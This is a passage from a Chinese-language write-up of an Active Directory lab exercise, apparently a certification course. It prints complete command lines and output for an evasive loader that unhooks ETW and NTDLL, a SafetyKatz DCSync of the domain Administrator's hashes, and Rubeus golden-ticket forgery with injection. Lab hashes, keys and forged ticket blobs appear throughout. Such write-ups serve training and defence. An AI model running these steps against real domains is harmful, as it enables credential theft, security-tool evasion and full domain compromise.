5c324b8ab38cfca7542d5befb9849fd9</span><br><span class="line">    11  f84dfb60f743b1368ea571504e34863a</span><br><span class="line">    12  e8ddc0d55ac23e847837791743b89d22</span><br><span class="line">    13  2281b35faded13ae4d78e33a1ef26933</span><br><span class="line">    14  f84dfb60f743b1368ea571504e34863a</span><br><span class="line">    15  d9ef5ed74ef473e89a570a10a706813e</span><br><span class="line">    16  d9ef5ed74ef473e89a570a10a706813e</span><br><span class="line">    17  87c75daa20ad259a6f783d61602086aa</span><br><span class="line">    18  f0016c07fcff7d479633e8998c75bcf7</span><br><span class="line">    19  7c4e5eb0d5d517f945cf22d74fec380e</span><br><span class="line">    20  cb97816ac064a567fe37e8e8c863f2a7</span><br><span class="line">    21  5adaa49a00f2803658c71f617031b385</span><br><span class="line">    22  5adaa49a00f2803658c71f617031b385</span><br><span class="line">    23  6d86f0be7751c8607e4b47912115bef2</span><br><span class="line">    24  caa61bbf6b9c871af646935febf86b95</span><br><span class="line">    25  caa61bbf6b9c871af646935febf86b95</span><br><span class="line">    26  5d8e8f8f63b3bb6dd48db5d0352c194c</span><br><span class="line">    27  3e139d350a9063db51226cfab9e42aa1</span><br><span class="line">    28  d745c0538c8fd103d71229b017a987ce</span><br><span class="line">    29  40b43724fa76e22b0d610d656fb49ddd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br></pre></td></tr></table></figure>

<p>这里比较诡异的是loader突然失效了，排除了下是在加载完invishell之后就g了，很奇怪</p>
<p>这里flag是<code>4e9815869d2090ccfca61c1fe0d23986</code></p>
<h2 id="Learning-Objective-8-2"><a href="#Learning-Objective-8-2" class="headerlink" title="Learning Objective - 8 - 2"></a>Learning Objective - 8 - 2</h2><blockquote>
<p>NTLM hash of domain administrator - Administrator</p>
</blockquote>
<blockquote>
<p>域Administrator用户hash</p>
</blockquote>
<p>和上面一样直接导就行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">C:\ad\tools&gt;<span class="built_in">set</span> COR_PROFILER_PATH=</span><br><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; .\loader.exe <span class="literal">-path</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/safetykatz.exe <span class="literal">-args</span> <span class="string">&quot;lsadump::evasive-dcsync /user:dcorp\administrator&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/safetykatz.exe Arguments : lsadump::evasive<span class="literal">-dcsync</span> /user:dcorp\administrator <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># lsadump::evasive-dcsync /user:dcorp\administrator</span></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dollarcorp.moneycorp.local&#x27;</span> will be the domain</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dcorp-dc.dollarcorp.moneycorp.local&#x27;</span> will be the DC server</span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;dcorp\administrator&#x27;</span> will be the user account</span><br><span class="line">[<span class="type">rpc</span>] Service  : ldap</span><br><span class="line">[<span class="type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">Object RDN           : Administrator</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : Administrator</span><br><span class="line">Account <span class="built_in">Type</span>         : <span class="number">30000000</span> ( USER_OBJECT )</span><br><span class="line">User Account Control : <span class="number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : <span class="number">11</span>/<span class="number">11</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">33</span>:<span class="number">55</span> AM</span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-719815819-3726368948-3917688648-500</span></span><br><span class="line">Object Relative ID   : <span class="number">500</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: af0686cc0ca8f04df42210c9ac980760</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">6</span>a53706d144b585f05e703bf463567bc</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer-Keys</span> *</span><br><span class="line">    Default Salt : WIN<span class="literal">-LOJKLRT8VA4Administrator</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">87918</span>d4c83a2aeb422999d908381bdeb1cef476195d3e532e5b1585adee6a12b</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">2851</span>a2dcf67dea5217c6fab951633584</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : ae857fd3ec19b63b</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">2</span>e0a4ff15d58c3bba89f032bd85f342c31bfc656b190e054f50690de029653f4</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : a3b5cb95b4d259fa6e13c9f9067203a9</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">08</span>ce97c4c720ce0d</span><br><span class="line">    OlderCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : dcc9a74b4c1fdaafab4a15e39bb0243d1e32b1d759895b19f5b6ecbe5dc7570f</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : a304a23629c774268a8253ac3bb494b5</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">1</span>a7332648c738f8a</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WIN<span class="literal">-LOJKLRT8VA4Administrator</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : ae857fd3ec19b63b</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : <span class="number">08</span>ce97c4c720ce0d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>

<p>flag是 <code>af0686cc0ca8f04df42210c9ac980760</code></p>
<h2 id="金票-golden-ticket"><a href="#金票-golden-ticket" class="headerlink" title="金票 golden ticket"></a>金票 golden ticket</h2><p>这里lab手册让做下伪造金票。</p>
<p>用刚才拿到的krbtgt的key伪造一张当前<code>dollarcorp.moneycorp.local</code>域的administrator用户的票据</p>
<p>首先需要当前域的sid</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line">S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span></span><br></pre></td></tr></table></figure>

<p>然后用krbtgt的aes256key 伪造域内的目标用户就可以了，这里让他查询走ldap来补全信息，再用 <code>printcmd</code> 看下输出命令，不急着注入 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">PS C:\AD\Tools&gt; .\loader.exe -path .\Rubeus.exe -args evasive-golden /user:administrator /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /printcmd /ldap /nowrap /ptt</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\Rubeus.exe Arguments : evasive-golden /user:administrator /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /printcmd /ldap /nowrap /ptt</span><br><span class="line">[*] Action: Build TGT</span><br><span class="line"></span><br><span class="line">[*] Trying to query LDAP using LDAPS for user information on domain controller dcorp-dc.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path &#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27; for &#x27;(samaccountname=administrator)&#x27;</span><br><span class="line">[*] Retrieving group and domain policy information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path &#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27; for &#x27;(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-719815819-3726368948-3917688648-513)(name=&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;))&#x27;</span><br><span class="line">[*] Attempting to mount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully mounted</span><br><span class="line">[*] Attempting to unmount: \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[*] \\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL successfully unmounted</span><br><span class="line">[*] Attempting to mount: \\us.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully mounted</span><br><span class="line">[*] Attempting to unmount: \\us.dollarcorp.moneycorp.local\SYSVOL</span><br><span class="line">[*] \\us.dollarcorp.moneycorp.local\SYSVOL successfully unmounted</span><br><span class="line">[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path &#x27;CN=Configuration,DC=moneycorp,DC=local&#x27; for &#x27;(&amp;(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))&#x27;</span><br><span class="line">[*] Retrieving group information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path &#x27;DC=dollarcorp,DC=moneycorp,DC=local&#x27; for &#x27;(|(distinguishedname=CN=Group Policy Creator Owners,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Domain Admins,CN=Users,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(distinguishedname=CN=Administrators,CN=Builtin,DC=us,DC=dollarcorp,DC=moneycorp,DC=local)(objectsid=S-1-5-21-1028785420-4100948154-1806204659-513))&#x27;</span><br><span class="line">[*] Retrieving netbios name information over LDAP from domain controller dcorp-dc.dollarcorp.moneycorp.local</span><br><span class="line">[*] Searching path &#x27;CN=Configuration,DC=moneycorp,DC=local&#x27; for &#x27;(&amp;(netbiosname=*)(dnsroot=dollarcorp.moneycorp.local))&#x27;</span><br><span class="line">[*] Building PAC</span><br><span class="line"></span><br><span class="line">[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)</span><br><span class="line">[*] SID            : S-1-5-21-719815819-3726368948-3917688648</span><br><span class="line">[*] UserId         : 500</span><br><span class="line">[*] Groups         : 544,512,520,513</span><br><span class="line">[*] ServiceKey     : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848</span><br><span class="line">[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256</span><br><span class="line">[*] KDCKey         : 154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848</span><br><span class="line">[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256</span><br><span class="line">[*] Service        : krbtgt</span><br><span class="line">[*] Target         : dollarcorp.moneycorp.local</span><br><span class="line"></span><br><span class="line">[*] Generating EncTicketPart</span><br><span class="line">[*] Signing PAC</span><br><span class="line">[*] Encrypting EncTicketPart</span><br><span class="line">[*] Generating Ticket</span><br><span class="line">[*] Generated KERB-CRED</span><br><span class="line">[*] Forged a TGT for &#x27;administrator@dollarcorp.moneycorp.local&#x27;</span><br><span class="line"></span><br><span class="line">[*] AuthTime       : 5/25/2025 10:38:21 PM</span><br><span class="line">[*] StartTime      : 5/25/2025 10:38:21 PM</span><br><span class="line">[*] EndTime        : 5/26/2025 8:38:21 AM</span><br><span class="line">[*] RenewTill      : 6/1/2025 10:38:21 PM</span><br><span class="line"></span><br><span class="line">[*] base64(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      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</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">[*] Printing a command to recreate a ticket containing the information used within this ticket</span><br><span class="line"></span><br><span class="line">C:\AD\Tools\Loader.exe Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:&quot;11/11/2022 6:34:22 AM&quot; /minpassage:1 /logoncount:317 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD</span><br></pre></td></tr></table></figure>

<p>观察下命令，没有想改的话就补全一下loader，然后加个 <code>ptt</code> 注入票据了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt;  C:\AD\Tools\Loader.exe <span class="literal">-path</span> .\Rubeus.exe <span class="literal">-args</span> Evasive<span class="literal">-Golden</span> /aes256:<span class="number">154</span>CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:administrator /id:<span class="number">500</span> /pgid:<span class="number">513</span> /domain:dollarcorp.moneycorp.local /sid:S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span> /pwdlastset:<span class="string">&quot;11/11/2022 6:34:22 AM&quot;</span> /minpassage:<span class="number">1</span> /logoncount:<span class="number">317</span> /netbios:dcorp /groups:<span class="number">544</span>,<span class="number">512</span>,<span class="number">520</span>,<span class="number">513</span> /dc:DCORP<span class="literal">-DC</span>.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\Rubeus.exe Arguments : Evasive<span class="literal">-Golden</span> /aes256:<span class="number">154</span>CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:administrator /id:<span class="number">500</span> /pgid:<span class="number">513</span> /domain:dollarcorp.moneycorp.local /sid:S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span> /pwdlastset:<span class="number">11</span>/<span class="number">11</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">34</span>:<span class="number">22</span> AM /minpassage:<span class="number">1</span> /logoncount:<span class="number">317</span> /netbios:dcorp /groups:<span class="number">544</span>,<span class="number">512</span>,<span class="number">520</span>,<span class="number">513</span> /dc:DCORP<span class="literal">-DC</span>.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt</span><br><span class="line">[*] Action: Build TGT</span><br><span class="line"></span><br><span class="line">[*] Building PAC</span><br><span class="line"></span><br><span class="line">[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (dcorp)</span><br><span class="line">[*] SID            : S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span></span><br><span class="line">[*] UserId         : <span class="number">500</span></span><br><span class="line">[*] Groups         : <span class="number">544</span>,<span class="number">512</span>,<span class="number">520</span>,<span class="number">513</span></span><br><span class="line">[*] ServiceKey     : <span class="number">154</span>CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848</span><br><span class="line">[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256</span><br><span class="line">[*] KDCKey         : <span class="number">154</span>CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848</span><br><span class="line">[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256</span><br><span class="line">[*] Service        : krbtgt</span><br><span class="line">[*] Target         : dollarcorp.moneycorp.local</span><br><span class="line"></span><br><span class="line">[*] Generating EncTicketPart</span><br><span class="line">[*] Signing PAC</span><br><span class="line">[*] Encrypting EncTicketPart</span><br><span class="line">[*] Generating Ticket</span><br><span class="line">[*] Generated KERB<span class="literal">-CRED</span></span><br><span class="line">[*] Forged a TGT <span class="keyword">for</span> <span class="string">&#x27;administrator@dollarcorp.moneycorp.local&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] AuthTime       : <span class="number">5</span>/<span class="number">25</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">09</span> PM</span><br><span class="line">[*] StartTime      : <span class="number">5</span>/<span class="number">25</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">09</span> PM</span><br><span class="line">[*] EndTime        : <span class="number">5</span>/<span class="number">26</span>/<span class="number">2025</span> <span class="number">8</span>:<span class="number">41</span>:<span class="number">09</span> AM</span><br><span class="line">[*] RenewTill      : <span class="number">6</span>/<span class="number">1</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">41</span>:<span class="number">09</span> PM</span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIGJDCCBiCgAwIBBaEDAgEWooIE3jCCBNphggTWMIIE0qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD</span><br><span class="line">      T1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOC</span><br><span class="line">      BHowggR2oAMCARKhAwIBA6KCBGgEggRkC1jLa/yWi/nPbJvkUcn1JrTDxRS5TWNXbDDfyeq2EXHLaTC+</span><br><span class="line">      Lcz5E2sWSiJyFcPYKole5TG4z2z8Uc0ngkXfySJa9dFm1dImhciWDFYbC5w1bECuJuwxTOE2gmVWlfyZ</span><br><span class="line">      lGkbeJAPpDxbhGRCBAXEkSFunqvdIsXoUBfxh66RDQVHOU1KUpacaOO1nJi5MO07oqFVWuBtv0GEhlaz</span><br><span class="line">      s1UMZCjtr0Jzvy8GHpc+A954GsuubhpZeINOcUC0AXMuiGqIrTrctNABOJFIp4JddqU7A98SdaU1IPti</span><br><span class="line">      VWoxnHAjTmnPKiDVXd5lmOtaNwZb7TurH3DNeoCsrefG/icoShjpxfyzW7OuI3nqPaLVCeYNJ0g67usy</span><br><span class="line">      /RB8WRSifHSmqOoWmPaftkvNkziWwCbjeDwtNKAah0dvxCQfX+CW/waZ+PC1Y9FB75EI55pLrlAIr/u5</span><br><span class="line">      UACk/qxhYll7cEkI1V6rf7pJh3+PWCCoy2RUYROSHukGumpJgHKqrsC2W57hTG/hRdPbBqTSJiKaQuA7</span><br><span class="line">      QKi9mpyu5uOCZSPf+RxUsTlPafkF00CmnrKRGcgoVo0qY3UpzfKDVT9qzjnZ7WdYZTm+AsWgsHXOt9xR</span><br><span class="line">      jUOW6jW38jNRjy+cSAfaBZoDY1lcfoeji7skPYB3/nJ+y6D7iPeGObhpjvCG+LQV8GtJk6pg2gfKFwAi</span><br><span class="line">      uMkJbF49jZSlvtBOj44l1NnJ6TzJxTxXMB2V3IPcHe/V3mZArD/<span class="number">9</span>iUJy3sjibS5Sk6dESfef7klt12dM</span><br><span class="line"> 